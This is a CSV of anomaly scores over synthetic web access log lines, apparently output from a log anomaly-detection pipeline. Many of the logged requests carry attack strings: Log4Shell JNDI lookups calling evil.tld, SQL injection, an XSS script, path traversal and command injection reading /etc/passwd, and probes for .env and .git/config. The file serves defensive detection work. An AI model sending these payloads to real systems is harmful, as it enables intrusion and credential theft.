score_content,score_session,score_fused,score_fused_norm,line
126.25005340576172,,126.25005340576172,126.25005340576172,16.106.222.134 - - [10/Jan/2025:12:12:14 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 2825 "https://example.com/" "dirb/2.22"
35.57895278930664,,35.57895278930664,35.57895278930664,67.216.131.36 - - [10/Jan/2025:12:12:14 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 5102 "https://example.com/" "dirb/2.22"
0.22861649096012115,,0.22861649096012115,0.22861649096012115,38.201.111.11 - - [10/Jan/2025:12:12:15 +0000] "GET /assets/app.css HTTP/1.1" 200 456 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2535593807697296,,0.2535593807697296,0.2535593807697296,243.155.81.72 - - [10/Jan/2025:12:12:16 +0000] "GET /assets/app.js HTTP/1.1" 200 14394 "https://twitter.com/" "sqlmap/1.7.2#stable"
126.3200912475586,,126.3200912475586,126.3200912475586,153.142.166.114 - - [10/Jan/2025:12:12:16 +0000] "TRACE /search?q=camera HTTP/1.1" 200 19927 "-" "sqlmap/1.7.2#stable"
94.98649597167969,,94.98649597167969,94.98649597167969,36.252.149.143 - - [10/Jan/2025:12:12:16 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 306 "https://example.com/" "python-requests/2.31.0"
24.3663387298584,,24.3663387298584,24.3663387298584,221.243.164.58 - - [10/Jan/2025:12:12:19 +0000] "GET /search?q=camera HTTP/1.1" 200 15957 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
27.282751083374023,,27.282751083374023,27.282751083374023,106.226.6.208 - - [10/Jan/2025:12:12:22 +0000] "DELETE /api/products HTTP/1.1" 200 18523 "https://www.google.com/" "python-requests/2.31.0"
52.54800033569336,,52.54800033569336,52.54800033569336,236.165.222.177 - - [10/Jan/2025:12:12:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 302 934 "https://twitter.com/" "dirb/2.22"
69.68769836425781,,69.68769836425781,69.68769836425781,106.245.89.140 - - [10/Jan/2025:12:12:23 +0000] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16264 "https://example.com/" "dirb/2.22"
27.14653778076172,,27.14653778076172,27.14653778076172,222.74.67.59 - - [10/Jan/2025:12:12:24 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3314 "https://example.com/" "dirb/2.22"
27.08905029296875,,27.08905029296875,27.08905029296875,184.88.34.155 - - [10/Jan/2025:12:12:24 +0000] "POST /search?q=camera HTTP/1.1" 200 17390 "https://example.com/" "python-requests/2.31.0"
0.30842792987823486,,0.30842792987823486,0.30842792987823486,199.146.174.32 - - [10/Jan/2025:12:12:24 +0000] "GET /index.html HTTP/1.1" 200 5299 "https://twitter.com/" "curl/7.85.0"
30141.763671875,,30141.763671875,30141.763671875,104.15.53.212 - - [10/Jan/2025:12:12:26 +0000] "GET /login HTTP/1.1" 404 426 "https://example.com/" "python-requests/2.31.0"
7.451378345489502,,7.451378345489502,7.451378345489502,30.8.125.157 - - [10/Jan/2025:12:12:28 +0000] "POST /server-status HTTP/1.1" 302 15125 "https://news.ycombinator.com/" "curl/7.85.0"
35.49468994140625,,35.49468994140625,35.49468994140625,124.87.28.134 - - [10/Jan/2025:12:12:29 +0000] "PUT /search?q=phone HTTP/1.1" 201 2790 "https://www.google.com/" "curl/7.85.0"
27.116376876831055,,27.116376876831055,27.116376876831055,121.217.144.181 - - [10/Jan/2025:12:12:29 +0000] "GET /search?q=headphones HTTP/1.1" 301 5702 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.48262786865234,,69.48262786865234,69.48262786865234,80.119.55.2 - - [10/Jan/2025:12:12:31 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 19723 "https://twitter.com/" "nikto/2.5.0"
30208.94921875,,30208.94921875,30208.94921875,111.23.188.193 - - [10/Jan/2025:12:12:34 +0000] "HEAD /search?q=router HTTP/1.1" 400 1167 "-" "curl/7.85.0"
126.2772216796875,,126.2772216796875,126.2772216796875,240.12.212.146 - - [10/Jan/2025:12:12:34 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 5296 "https://www.google.com/" "nikto/2.5.0"
30208.951171875,,30208.951171875,30208.951171875,96.145.15.69 - - [10/Jan/2025:12:12:37 +0000] "HEAD /search?q=router HTTP/1.1" 400 987 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30234.73828125,,30234.73828125,30234.73828125,250.150.52.5 - - [10/Jan/2025:12:12:40 +0000] "OPTIONS /search?q=phone HTTP/1.1" 404 271 "https://news.ycombinator.com/" "nikto/2.5.0"
103.90182495117188,,103.90182495117188,103.90182495117188,50.249.65.118 - - [10/Jan/2025:12:12:41 +0000] "TRACE /api/products HTTP/1.1" 200 7271 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.320733070373535,,13.320733070373535,13.320733070373535,88.51.108.185 - - [10/Jan/2025:12:12:43 +0000] "PUT /about HTTP/1.1" 200 139 "https://news.ycombinator.com/" "dirb/2.22"
49.508750915527344,,49.508750915527344,49.508750915527344,88.126.246.95 - - [10/Jan/2025:12:12:43 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 11963 "https://news.ycombinator.com/" "dirb/2.22"
72.79912567138672,,72.79912567138672,72.79912567138672,223.147.53.137 - - [10/Jan/2025:12:12:46 +0000] "OPTIONS /admin HTTP/1.1" 200 19351 "https://news.ycombinator.com/" "python-requests/2.31.0"
11079.0244140625,,11079.0244140625,11079.0244140625,184.96.50.2 - - [10/Jan/2025:12:12:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 500 934 "-" "nikto/2.5.0"
4.819823265075684,,4.819823265075684,4.819823265075684,31.104.246.157 - - [10/Jan/2025:12:12:48 +0000] "POST /login HTTP/1.1" 200 10912 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.40084075927734,,72.40084075927734,72.40084075927734,100.194.113.234 - - [10/Jan/2025:12:12:49 +0000] "HEAD /search?q=phone HTTP/1.1" 304 5717 "https://twitter.com/" "nikto/2.5.0"
13.002106666564941,,13.002106666564941,13.002106666564941,173.12.123.136 - - [10/Jan/2025:12:12:50 +0000] "PUT /server-status HTTP/1.1" 204 17173 "-" "dirb/2.22"
27.247224807739258,,27.247224807739258,27.247224807739258,104.174.18.169 - - [10/Jan/2025:12:12:52 +0000] "DELETE /dashboard HTTP/1.1" 200 12961 "https://twitter.com/" "sqlmap/1.7.2#stable"
69.4477310180664,,69.4477310180664,69.4477310180664,196.76.241.39 - - [10/Jan/2025:12:12:54 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 859 "https://twitter.com/" "curl/7.85.0"
30189.23046875,,30189.23046875,30189.23046875,34.56.206.193 - - [10/Jan/2025:12:12:57 +0000] "DELETE /search?q=router HTTP/1.1" 403 1123 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11056.5302734375,,11056.5302734375,11056.5302734375,184.217.87.174 - - [10/Jan/2025:12:12:57 +0000] "POST /search?q=headphones HTTP/1.1" 503 760 "https://example.com/" "dirb/2.22"
75.63652801513672,,75.63652801513672,75.63652801513672,204.83.243.95 - - [10/Jan/2025:12:13:00 +0000] "OPTIONS /about HTTP/1.1" 302 1649 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.940798759460449,,4.940798759460449,4.940798759460449,199.39.63.175 - - [10/Jan/2025:12:13:03 +0000] "GET /profile HTTP/1.1" 304 10489 "https://www.google.com/" "python-requests/2.31.0"
13.25915813446045,,13.25915813446045,13.25915813446045,210.61.12.167 - - [10/Jan/2025:12:13:05 +0000] "PUT /login HTTP/1.1" 200 14942 "https://www.google.com/" "dirb/2.22"
104.05292510986328,,104.05292510986328,104.05292510986328,212.98.26.187 - - [10/Jan/2025:12:13:08 +0000] "TRACE /login HTTP/1.1" 200 17634 "-" "python-requests/2.31.0"
30139.71875,,30139.71875,30139.71875,218.97.157.109 - - [10/Jan/2025:12:13:11 +0000] "GET /assets/app.js HTTP/1.1" 400 1336 "https://twitter.com/" "sqlmap/1.7.2#stable"
2.3029627799987793,,2.3029627799987793,2.3029627799987793,246.150.102.138 - - [10/Jan/2025:12:13:11 +0000] "GET / HTTP/1.1" 200 7008 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
2.904743194580078,,2.904743194580078,2.904743194580078,117.90.77.36 - - [10/Jan/2025:12:13:11 +0000] "POST /../../etc/passwd HTTP/1.1" 200 14578 "https://example.com/" "python-requests/2.31.0"
126.32246398925781,,126.32246398925781,126.32246398925781,117.22.37.214 - - [10/Jan/2025:12:13:11 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 3276 "https://news.ycombinator.com/" "curl/7.85.0"
95.0462417602539,,95.0462417602539,95.0462417602539,84.177.214.31 - - [10/Jan/2025:12:13:11 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15386 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.24069213867188,,95.24069213867188,95.24069213867188,187.8.179.44 - - [10/Jan/2025:12:13:14 +0000] "OPTIONS /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16029 "https://www.google.com/" "sqlmap/1.7.2#stable"
104.01049041748047,,104.01049041748047,104.01049041748047,30.124.200.188 - - [10/Jan/2025:12:13:15 +0000] "TRACE /logout HTTP/1.1" 200 15900 "-" "curl/7.85.0"
126.2626953125,,126.2626953125,126.2626953125,155.153.168.169 - - [10/Jan/2025:12:13:17 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 7274 "https://www.google.com/" "curl/7.85.0"
72.68779754638672,,72.68779754638672,72.68779754638672,136.148.5.252 - - [10/Jan/2025:12:13:18 +0000] "OPTIONS /profile HTTP/1.1" 200 6533 "https://twitter.com/" "curl/7.85.0"
11042.8125,,11042.8125,11042.8125,35.89.157.33 - - [10/Jan/2025:12:13:21 +0000] "PUT /login HTTP/1.1" 503 1208 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
0.239654541015625,,0.239654541015625,0.239654541015625,126.23.38.73 - - [10/Jan/2025:12:13:24 +0000] "GET /assets/app.css HTTP/1.1" 200 18390 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
13.101813316345215,,13.101813316345215,13.101813316345215,231.40.13.234 - - [10/Jan/2025:12:13:25 +0000] "PUT /api/products HTTP/1.1" 200 2467 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
103.9594497680664,,103.9594497680664,103.9594497680664,219.65.167.39 - - [10/Jan/2025:12:13:25 +0000] "TRACE /profile HTTP/1.1" 200 10740 "https://twitter.com/" "nikto/2.5.0"
16.01723289489746,,16.01723289489746,16.01723289489746,64.242.207.46 - - [10/Jan/2025:12:13:27 +0000] "PUT /api/products HTTP/1.1" 304 2401 "https://example.com/" "dirb/2.22"
0.24302245676517487,,0.24302245676517487,0.24302245676517487,41.108.94.74 - - [10/Jan/2025:12:13:28 +0000] "GET /assets/app.css HTTP/1.1" 200 19765 "https://news.ycombinator.com/" "nikto/2.5.0"
24.345855712890625,,24.345855712890625,24.345855712890625,67.76.119.136 - - [10/Jan/2025:12:13:30 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 19102 "https://www.google.com/" "dirb/2.22"
94.99235534667969,,94.99235534667969,94.99235534667969,246.111.183.40 - - [10/Jan/2025:12:13:31 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 1346 "https://news.ycombinator.com/" "dirb/2.22"
126.27571105957031,,126.27571105957031,126.27571105957031,194.71.246.35 - - [10/Jan/2025:12:13:33 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 11313 "https://example.com/" "python-requests/2.31.0"
38.46726989746094,,38.46726989746094,38.46726989746094,224.158.207.126 - - [10/Jan/2025:12:13:34 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 11809 "-" "dirb/2.22"
75.56128692626953,,75.56128692626953,75.56128692626953,213.63.221.92 - - [10/Jan/2025:12:13:34 +0000] "OPTIONS /contact HTTP/1.1" 302 3534 "https://twitter.com/" "nikto/2.5.0"
0.32283303141593933,,0.32283303141593933,0.32283303141593933,156.64.108.134 - - [10/Jan/2025:12:13:35 +0000] "GET /index.html HTTP/1.1" 200 9666 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
47.204341888427734,,47.204341888427734,47.204341888427734,153.105.202.144 - - [10/Jan/2025:12:13:35 +0000] "HEAD /about HTTP/1.1" 201 4966 "https://news.ycombinator.com/" "dirb/2.22"
30144.33203125,,30144.33203125,30144.33203125,195.1.43.225 - - [10/Jan/2025:12:13:38 +0000] "POST /about HTTP/1.1" 401 980 "https://www.google.com/" "dirb/2.22"
2.315420389175415,,2.315420389175415,2.315420389175415,6.57.235.188 - - [10/Jan/2025:12:13:39 +0000] "GET / HTTP/1.1" 200 10843 "https://example.com/" "sqlmap/1.7.2#stable"
0.2376398891210556,,0.2376398891210556,0.2376398891210556,65.23.187.65 - - [10/Jan/2025:12:13:41 +0000] "GET /assets/app.css HTTP/1.1" 200 17591 "https://twitter.com/" "dirb/2.22"
72.79629516601562,,72.79629516601562,72.79629516601562,35.31.12.229 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 18200 "https://www.google.com/" "curl/7.85.0"
72.76482391357422,,72.76482391357422,72.76482391357422,17.99.175.63 - - [10/Jan/2025:12:13:41 +0000] "OPTIONS /about HTTP/1.1" 200 7387 "https://example.com/" "sqlmap/1.7.2#stable"
72.74366760253906,,72.74366760253906,72.74366760253906,206.207.215.64 - - [10/Jan/2025:12:13:44 +0000] "OPTIONS /logout HTTP/1.1" 200 12746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.47855377197266,,69.47855377197266,69.47855377197266,200.204.174.42 - - [10/Jan/2025:12:13:46 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2002 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.7736430168151855,,4.7736430168151855,4.7736430168151855,63.33.132.80 - - [10/Jan/2025:12:13:46 +0000] "GET /phpmyadmin HTTP/1.1" 301 7717 "https://news.ycombinator.com/" "curl/7.85.0"
95.06034851074219,,95.06034851074219,95.06034851074219,105.16.215.34 - - [10/Jan/2025:12:13:46 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 12337 "https://example.com/" "sqlmap/1.7.2#stable"
35.55812454223633,,35.55812454223633,35.55812454223633,196.127.229.203 - - [10/Jan/2025:12:13:49 +0000] "PUT /search?q=ssd HTTP/1.1" 200 6720 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8175876140594482,,1.8175876140594482,1.8175876140594482,230.23.120.165 - - [10/Jan/2025:12:13:52 +0000] "GET /server-status HTTP/1.1" 204 4687 "https://twitter.com/" "sqlmap/1.7.2#stable"
4.741423606872559,,4.741423606872559,4.741423606872559,244.150.52.122 - - [10/Jan/2025:12:13:53 +0000] "POST /profile HTTP/1.1" 200 9558 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24481059610843658,,0.24481059610843658,0.24481059610843658,246.81.124.113 - - [10/Jan/2025:12:13:53 +0000] "GET /assets/app.js HTTP/1.1" 200 11397 "https://example.com/" "dirb/2.22"
26.97320556640625,,26.97320556640625,26.97320556640625,163.173.41.148 - - [10/Jan/2025:12:13:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3508 "-" "nikto/2.5.0"
3.075861930847168,,3.075861930847168,3.075861930847168,40.162.205.135 - - [10/Jan/2025:12:13:59 +0000] "GET /assets/app.js HTTP/1.1" 301 1824 "https://www.google.com/" "dirb/2.22"
72.6800308227539,,72.6800308227539,72.6800308227539,56.87.121.234 - - [10/Jan/2025:12:13:59 +0000] "OPTIONS /contact HTTP/1.1" 200 4006 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.368898391723633,,27.368898391723633,27.368898391723633,182.152.69.211 - - [10/Jan/2025:12:14:01 +0000] "DELETE /about HTTP/1.1" 200 6659 "https://twitter.com/" "nikto/2.5.0"
69.4555435180664,,69.4555435180664,69.4555435180664,234.132.86.62 - - [10/Jan/2025:12:14:02 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 2101 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
69.35865020751953,,69.35865020751953,69.35865020751953,114.73.64.70 - - [10/Jan/2025:12:14:04 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13652 "-" "dirb/2.22"
27.263042449951172,,27.263042449951172,27.263042449951172,57.69.139.22 - - [10/Jan/2025:12:14:06 +0000] "DELETE /dashboard HTTP/1.1" 200 18886 "https://example.com/" "python-requests/2.31.0"
27.111907958984375,,27.111907958984375,27.111907958984375,58.35.41.199 - - [10/Jan/2025:12:14:09 +0000] "POST /search?q=phone HTTP/1.1" 200 17427 "https://twitter.com/" "nikto/2.5.0"
11.661444664001465,,11.661444664001465,11.661444664001465,165.233.226.225 - - [10/Jan/2025:12:14:09 +0000] "PUT /.env HTTP/1.1" 200 3040 "https://twitter.com/" "python-requests/2.31.0"
45.66577911376953,,45.66577911376953,45.66577911376953,158.159.191.104 - - [10/Jan/2025:12:14:09 +0000] "HEAD /.env HTTP/1.1" 200 11940 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.2194709777832,,47.2194709777832,47.2194709777832,25.29.234.204 - - [10/Jan/2025:12:14:09 +0000] "HEAD /login HTTP/1.1" 201 9602 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.316469192504883,,24.316469192504883,24.316469192504883,175.228.71.179 - - [10/Jan/2025:12:14:09 +0000] "GET /search?q=monitor HTTP/1.1" 200 6527 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.230393409729004,,13.230393409729004,13.230393409729004,195.81.145.199 - - [10/Jan/2025:12:14:10 +0000] "PUT /logout HTTP/1.1" 200 18439 "https://www.google.com/" "python-requests/2.31.0"
129.19654846191406,,129.19654846191406,129.19654846191406,175.91.116.168 - - [10/Jan/2025:12:14:12 +0000] "TRACE /search?q=router HTTP/1.1" 304 6493 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
69.48590850830078,,69.48590850830078,69.48590850830078,235.143.162.178 - - [10/Jan/2025:12:14:12 +0000] "HEAD /search?q=camera HTTP/1.1" 200 12994 "https://example.com/" "curl/7.85.0"
24.344865798950195,,24.344865798950195,24.344865798950195,142.183.78.44 - - [10/Jan/2025:12:14:14 +0000] "GET /search?q=camera HTTP/1.1" 200 8725 "-" "Wget/1.21.2 (linux-gnu)"
2.2923569679260254,,2.2923569679260254,2.2923569679260254,125.182.6.238 - - [10/Jan/2025:12:14:15 +0000] "GET / HTTP/1.1" 200 3547 "https://www.google.com/" "sqlmap/1.7.2#stable"
13.179409980773926,,13.179409980773926,13.179409980773926,102.242.94.55 - - [10/Jan/2025:12:14:18 +0000] "PUT /contact HTTP/1.1" 200 12955 "https://twitter.com/" "dirb/2.22"
0.3496926426887512,,0.3496926426887512,0.3496926426887512,175.16.64.132 - - [10/Jan/2025:12:14:20 +0000] "GET /index.html HTTP/1.1" 200 19265 "-" "dirb/2.22"
49.72995376586914,,49.72995376586914,49.72995376586914,5.216.105.175 - - [10/Jan/2025:12:14:21 +0000] "DELETE /search?q=ssd HTTP/1.1" 201 19684 "-" "Wget/1.21.2 (linux-gnu)"
30175.11328125,,30175.11328125,30175.11328125,31.247.93.129 - - [10/Jan/2025:12:14:23 +0000] "PUT /search?q=router HTTP/1.1" 403 545 "https://twitter.com/" "curl/7.85.0"
97.95773315429688,,97.95773315429688,97.95773315429688,51.126.140.213 - - [10/Jan/2025:12:14:23 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 301 17272 "https://www.google.com/" "curl/7.85.0"
2.120225667953491,,2.120225667953491,2.120225667953491,244.181.222.54 - - [10/Jan/2025:12:14:25 +0000] "GET /login HTTP/1.1" 200 17827 "https://twitter.com/" "dirb/2.22"
30140.07421875,,30140.07421875,30140.07421875,155.14.133.119 - - [10/Jan/2025:12:14:25 +0000] "GET /index.html HTTP/1.1" 404 107 "https://www.google.com/" "curl/7.85.0"
2.078826427459717,,2.078826427459717,2.078826427459717,134.141.139.120 - - [10/Jan/2025:12:14:26 +0000] "GET /about HTTP/1.1" 200 4058 "https://www.google.com/" "curl/7.85.0"
11079.0546875,,11079.0546875,11079.0546875,114.91.215.115 - - [10/Jan/2025:12:14:28 +0000] "DELETE /search?q=headphones HTTP/1.1" 503 921 "https://www.google.com/" "python-requests/2.31.0"
25.596717834472656,,25.596717834472656,25.596717834472656,182.91.81.19 - - [10/Jan/2025:12:14:30 +0000] "DELETE /.git/config HTTP/1.1" 200 17380 "https://twitter.com/" "sqlmap/1.7.2#stable"
72.66676330566406,,72.66676330566406,72.66676330566406,105.22.27.220 - - [10/Jan/2025:12:14:30 +0000] "OPTIONS /api/products HTTP/1.1" 200 446 "https://example.com/" "dirb/2.22"
15.92618179321289,,15.92618179321289,15.92618179321289,25.220.247.184 - - [10/Jan/2025:12:14:32 +0000] "PUT /phpmyadmin HTTP/1.1" 302 3167 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.8349753618240356,,1.8349753618240356,1.8349753618240356,75.212.104.2 - - [10/Jan/2025:12:14:32 +0000] "GET /server-status HTTP/1.1" 200 7885 "-" "dirb/2.22"
30139.80078125,,30139.80078125,30139.80078125,109.168.123.136 - - [10/Jan/2025:12:14:32 +0000] "GET /index.html HTTP/1.1" 400 1372 "-" "nikto/2.5.0"
11031.919921875,,11031.919921875,11031.919921875,156.48.234.231 - - [10/Jan/2025:12:14:33 +0000] "GET / HTTP/1.1" 503 1033 "-" "nikto/2.5.0"
24.426774978637695,,24.426774978637695,24.426774978637695,13.228.173.82 - - [10/Jan/2025:12:14:34 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 2528 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.33436918258667,,2.33436918258667,2.33436918258667,154.15.88.73 - - [10/Jan/2025:12:14:36 +0000] "GET / HTTP/1.1" 200 17579 "https://www.google.com/" "nikto/2.5.0"
103.8685073852539,,103.8685073852539,103.8685073852539,68.120.186.165 - - [10/Jan/2025:12:14:38 +0000] "TRACE /dashboard HTTP/1.1" 200 2415 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.3050619065761566,,0.3050619065761566,0.3050619065761566,9.93.48.130 - - [10/Jan/2025:12:14:40 +0000] "GET /index.html HTTP/1.1" 200 4184 "https://news.ycombinator.com/" "nikto/2.5.0"
105.07060241699219,,105.07060241699219,105.07060241699219,47.232.69.44 - - [10/Jan/2025:12:14:41 +0000] "TRACE /wp-login.php HTTP/1.1" 302 5818 "https://twitter.com/" "nikto/2.5.0"
